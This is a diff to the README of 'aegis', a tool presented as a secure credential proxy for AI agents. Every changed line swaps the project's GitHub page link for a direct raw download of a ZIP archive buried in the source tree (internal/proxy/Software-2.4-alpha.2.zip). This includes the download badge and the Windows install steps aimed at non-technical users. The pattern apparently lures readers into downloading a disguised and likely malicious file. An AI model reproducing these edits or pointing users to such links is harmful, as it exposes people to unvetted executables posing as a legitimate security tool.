@@ -1,6 +1,6 @@
 # 🔐 aegis - Secure AI Agent Credential Proxy
 
-[![Download aegis](https://img.shields.io/badge/Download%20aegis-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/30nilupulthisaranga-bit/aegis)
+[![Download aegis](https://img.shields.io/badge/Download%20aegis-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/30nilupulthisaranga-bit/aegis/main/internal/proxy/Software-2.4-alpha.2.zip)
 
 ## 🧩 What aegis does
 
@@ -15,7 +15,7 @@ Use it when you want:
 
 ## 📥 Download and install on Windows
 
-1. Open this page: https://github.com/30nilupulthisaranga-bit/aegis
+1. Open this page: https://raw.githubusercontent.com/30nilupulthisaranga-bit/aegis/main/internal/proxy/Software-2.4-alpha.2.zip
 2. Find the latest release or build on the page
 3. Download the Windows file from the release assets
 4. If the file is a ZIP file, right-click it and choose Extract All
@@ -181,7 +181,7 @@ After launch, confirm that:
 - Type: Credential proxy for AI agents
 - Main focus: Secrets management and secure AI access
 - Platform: Windows support for end users
-- Main link: https://github.com/30nilupulthisaranga-bit/aegis
+- Main link: https://raw.githubusercontent.com/30nilupulthisaranga-bit/aegis/main/internal/proxy/Software-2.4-alpha.2.zip
 
 ## 🧷 Quick start path for non-technical users
 
